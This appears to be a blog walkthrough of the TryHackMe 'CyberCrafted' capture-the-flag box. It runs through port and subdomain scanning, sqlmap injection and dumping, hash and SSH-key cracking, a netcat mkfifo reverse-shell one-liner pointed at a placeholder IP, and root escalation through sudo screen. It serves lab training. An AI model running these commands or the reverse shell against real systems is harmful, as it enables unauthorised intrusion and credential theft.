---
title: THM CyberCrafted
date: 2023-09-16 08:01:00 -0800
categories: [Walkthrough, TryHackMe]
tags: [THM, TryHackMe, CTF]
published: true
---

## CyberCrafted

Hello. Here is my write up for the TryHackMe box CyberCrafted. It's a medium ranked machine that has an in-development minecraft server that we will try to root. This writeup assumes you have knowledge of basic penetration testing tools but I will go through any of the advanced techniques should I find any.

## enumeration

### nmap

As first I will start off with nmap scans for open ports and services. I use a script that is on my github called [0xscan](https://github.com/0xskar/0xscan). It's just a bash script that automates the port scanning.

Here we find 3 open ports, 22 SSH, 80 HTTP, and a minecraft server on 25565.

Noticing the redirect on the http server we will add cybercrafted.thm to /etc/hosts an scan the domain for subdomains and other information.

### sub-domains

I have the best luck using wfuzz for quick domain scanning here is my goto command for different scenarios only the hidewords or text generally needs to be modified:

- `wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://cybercrafted.thm -H "Host: FUZZ.cybercrafted.thm" --hw 0`

Here we see three domains in the output - with these we can start enumerating files and other subdirectories with gobuster or feroxbuster

```
000000001:   200        34 L     71 W       832 Ch      "www"                                 
000000037:   403        9 L      28 W       287 Ch      "store"                               
000000036:   200        30 L     64 W       937 Ch      "admin"
```

### www.cybercrafted.thm

Using gobuster to scan for specific file extensions and directories

- `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -u http://www.cybercrafted.thm -x txt,php,html`

![secret directory](/assets/cybercrafted_01.png)

Here we can see a secret directory with some jpegs, the file sizes look a little strange. Going to download these to my machine.

#### stegcracker herobrine-3.jpeg

Find something here inside of this jpeg but I cant figure out how to decode.

- `IDDOJQWM5BAMEQGIZLBMQQEKTSEEE======`

### store.cybercrafted.thm

running a gobuster scan here we reveal search.php which using sqlmap we find it is vulnerable to sql injection. 

- `sqlmap --wizard`

```
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL >= 5.0.12
banner: '5.7.35-0ubuntu0.18.04.1'
current user: 'root@localhost'
current database: 'webapp'
current user is DBA: False
```

lets enumerate databases

- `sqlmap -u "http://store.cybercrafted.thm/search.php" --method POST --data "search=&submit=" -p search --batch --dump`

![sql map dump](/assets/cybercrafted_02.png)


### hashcat

we use hashcat to identify the hash which is sha-1 raw we can then use it again to crack the hash

- `hashcat -m 100 '88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01' /usr/share/wordlists/rockyou.txt`

![hashcatting](/assets/cybercrafted_03.png)

## getting reverse shell 

using the previous credentials we can login to the admin panel and run some system commpands, probably get a reverse shell onto the system.

start up a netcat listener `nc -nvlp 9001`

then run system command to recieve shell: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP_ADDR 9001 >/tmp/f`

### escalation

checking the home directory we can see the users dir and the .ssh and id_rsa is accessible. we can copy the contents of the id_rsa to our pc and feed it to ssh2john to get a hash then feed the hash to john to get the password for the rsa file and use the chmod'd 400 id_rsa to ssh into the system as our user.

Once logged into the user check /opt/minecraft for the server flag and a note. Also check the plugin directory and get the user passwords checking the log file.

once we su to cybercrafted `sudo -l` lets us see we can run screen as root.

`sudo scree`

using screen commands we can drop a shell with `control+a` then `c`
